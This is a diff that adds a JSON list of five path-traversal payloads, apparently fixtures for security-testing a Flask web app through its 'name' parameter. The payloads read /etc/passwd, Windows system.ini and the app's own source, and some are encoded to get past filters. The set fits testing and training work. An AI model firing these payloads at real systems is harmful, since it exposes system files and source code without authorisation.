@@ -1,0 +1,37 @@
+[
+  {
+    "id": "pt_001",
+    "name": "Unix root passwd",
+    "payload": "../../../../etc/passwd",
+    "param": "name",
+    "description": "Classic path traversal to read /etc/passwd"
+  },
+  {
+    "id": "pt_002",
+    "name": "URL-encoded traversal",
+    "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+    "param": "name",
+    "description": "URL-encoded variant to bypass naive filters"
+  },
+  {
+    "id": "pt_003",
+    "name": "Double-encoded traversal",
+    "payload": "..%252F..%252Fetc%252Fpasswd",
+    "param": "name",
+    "description": "Double URL encoding to bypass sanitization"
+  },
+  {
+    "id": "pt_004",
+    "name": "Windows system.ini",
+    "payload": "..\\..\\..\\windows\\system.ini",
+    "param": "name",
+    "description": "Windows-style path traversal"
+  },
+  {
+    "id": "pt_005",
+    "name": "App source read",
+    "payload": "../app.py",
+    "param": "name",
+    "description": "Read the Flask application source code directly"
+  }
+]
